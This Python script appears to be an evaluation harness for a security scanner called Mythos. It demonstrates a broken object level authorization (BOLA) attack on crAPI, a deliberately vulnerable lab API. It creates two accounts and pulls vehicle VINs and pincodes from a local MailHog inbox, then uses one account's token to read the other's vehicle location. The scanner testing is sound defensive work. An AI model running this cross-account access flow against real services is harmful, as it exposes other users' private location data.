#!/usr/bin/env python3
"""crAPI end-to-end BOLA demonstration using the Mythos two-account check.

Registers two users, completes the vehicle-onboarding flow by reading the
VIN + pincode from the welcome email in MailHog, then uses the attacker
identity to read the victim's vehicle location — confirming BOLA.

Run inside the toolbox on the crapi_default network:
  python3 scripts/eval/crapi_bola.py
"""
from __future__ import annotations

import random
import re
import sys
import time

import requests

ID = "http://crapi-identity:8080"
MAIL = "http://mailhog:8025"
PW = "Mythos123!"


def signup_login(name: str) -> tuple[str, str]:
    email = f"{name}{random.randint(10000,99999)}@mythos.local"
    number = "9" + str(random.randint(100000000, 999999999))
    requests.post(f"{ID}/identity/api/auth/signup", timeout=15, json={
        "name": name, "email": email, "number": number, "password": PW})
    tok = ""
    for _ in range(6):
        time.sleep(2)
        r = requests.post(f"{ID}/identity/api/auth/login", timeout=15,
                          json={"email": email, "password": PW})
        try:
            tok = r.json().get("token") or ""
        except Exception:
            tok = ""
        if tok:
            break
    return email, tok


def mail_vehicle(email: str) -> tuple[str, str]:
    """Return (vin, pincode) from the user's vehicle email in MailHog.

    crAPI sends an HTML email (VIN wrapped in <font> tags, quoted-printable
    encoded). Decode QP, strip tags, then extract.
    """
    import quopri
    for _ in range(10):
        time.sleep(2)
        msgs = requests.get(f"{MAIL}/api/v2/messages", timeout=15).json()
        for m in msgs.get("items", []):
            to = ",".join(m["Content"]["Headers"].get("To", []))
            if email not in to:
                continue
            raw = m.get("Raw", {}).get("Data", "") or m["Content"]["Body"]
            txt = quopri.decodestring(raw.encode("utf-8", "replace")).decode("utf-8", "replace")
            txt = re.sub(r"<[^>]+>", " ", txt)
            vin = re.search(r"VIN:\s*([A-HJ-NPR-Z0-9]{8,17})", txt)
            pin = re.search(r"Pincode:\s*([0-9]{3,8})", txt)
            if vin and pin:
                return vin.group(1), pin.group(1)
    return "", ""


def auth(tok: str) -> dict:
    return {"Authorization": f"Bearer {tok}", "Content-Type": "application/json"}


def onboard_vehicle(tok: str, vin: str, pin: str) -> dict | None:
    # verify/associate the vehicle, then fetch the user's vehicle(s)
    for path, payload in [
        (f"/identity/api/v2/vehicle/{vin}/verify-vehicle", {"pincode": pin}),
        ("/identity/api/v2/vehicle/add_vehicle", {"vin": vin, "pincode": pin}),
    ]:
        try:
            requests.post(ID + path, headers=auth(tok), json=payload, timeout=15)
        except Exception:
            pass
    time.sleep(1)
    r = requests.get(f"{ID}/identity/api/v2/vehicle/vehicles", headers=auth(tok), timeout=15)
    try:
        arr = r.json()
    except Exception:
        return None
    vehicles = arr if isinstance(arr, list) else arr.get("vehicles") or arr.get("data") or []
    return vehicles[0] if vehicles else None


def main() -> int:
    sys.path.insert(0, "/repo/engine/src")
    from mythos.http_client import HttpClient
    from mythos.scope import Scope
    from mythos.scan.bola import check_bola

    ea, ta = signup_login("alice")
    eb, tb = signup_login("bob")
    print(f"alice token={'yes' if ta else 'NO'}  bob token={'yes' if tb else 'NO'}")
    if not (ta and tb):
        print("FAIL: could not obtain tokens"); return 1

    va, pa = mail_vehicle(ea)
    vb, pb = mail_vehicle(eb)
    print(f"alice vin={va or 'none'} pin={'yes' if pa else 'no'}; bob vin={vb or 'none'}")

    veh_a = onboard_vehicle(ta, va, pa) if va else None
    veh_b = onboard_vehicle(tb, vb, pb) if vb else None
    print("alice vehicle:", veh_a)
    print("bob vehicle:", veh_b)
    if not veh_a:
        print("NOTE: could not enumerate alice's vehicle id via the onboarding flow")
        return 2

    vid_a = veh_a.get("uuid") or veh_a.get("id") or veh_a.get("vehicleId")
    url_a = f"{ID}/identity/api/v2/vehicle/{vid_a}/location"
    url_b = None
    if veh_b:
        vid_b = veh_b.get("uuid") or veh_b.get("id") or veh_b.get("vehicleId")
        url_b = f"{ID}/identity/api/v2/vehicle/{vid_b}/location"

    def mk(tok):
        sc = Scope.from_dict({"in_scope": ["crapi-identity"],
                              "auth": {"bearer": tok}, "rules": {"rate_limit_rps": 1000}})
        return HttpClient(scope=sc)

    victim, attacker = mk(ta), mk(tb)
    findings = check_bola(victim, attacker, object_url=url_a, attacker_own_url=url_b)
    if findings:
        f = findings[0]
        print(f"\nBOLA CONFIRMED: {f.title}\n  object={f.url}\n  evidence={f.evidence.response}")
        return 0
    print("\nBOLA not confirmed (attacker could not read victim's vehicle location)")
    return 3


if __name__ == "__main__":
    raise SystemExit(main())
